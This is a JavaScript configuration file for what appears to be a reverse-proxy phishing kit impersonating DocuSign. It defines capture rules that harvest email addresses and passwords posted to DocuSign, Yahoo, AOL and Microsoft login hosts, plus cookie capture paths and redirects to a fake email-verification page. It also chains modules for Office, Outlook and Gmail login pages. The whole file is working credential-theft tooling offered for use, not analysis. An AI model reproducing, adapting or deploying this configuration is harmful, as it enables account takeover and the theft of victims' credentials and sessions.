/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/')
const YAHOO_MODULE = require('../yahoo/')
const OUTLOOK_MODULE = require('../outlook/')
const AOL_MODULE = require('../aol/')
const GMAIL_MODULE = require('../gmail/')
/** Defined Functions used */


/** Important Defaults */

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.url.startsWith('/v3/home') 
        || this.req.url.startsWith('/v3/Media/Manage')
        || this.req.url.startsWith('/authentication')
         ) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: `/email/verify/auth?qrc=${clientContext.sessionBody.loginUserName}` })
            return this.res.end('')
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(JSON.stringify(redirectToken))

            if (redirectToken.obj.host === 'app.docusign.com') {
                clientContext.currentDomain = 'app.docusign.com'
            } else if (redirectToken.obj.host === 'apps.docusign.com') {
                clientContext.currentDomain = 'apps.docusign.com'
            }

            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }


       

        return super.execute(clientContext)

    }
}







const configExport = {

    IS_PREMIUM: true,

    SCHEME: 'docusign',

    AUTOGRAB_CODE: 'login_hint',

    CURRENT_DOMAIN: 'account.docusign.com',

    START_PATH: '/',

    COOKIE_PATH: ['/__settings'],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://www.docusign.com/logged-out',

    // EXTERNAL_FILTERS: 
    // [
    //     'apps.docusign.com',
    //     'app.docusign.com'
    // ],

    PHP_PROCESSOR: {

        '/email/verify/auth': {
            GET: {
                script: 'validate.php',
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },
    },


    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['email'],
            urls: [],
            hosts: ['account.docusign.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: [],
            hosts: ['account.docusign.com'],
        },

        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },


    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: null,
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: null,
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: null,
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: null,
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: null,
            module: GMAIL_MODULE,
        }
    ],
    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

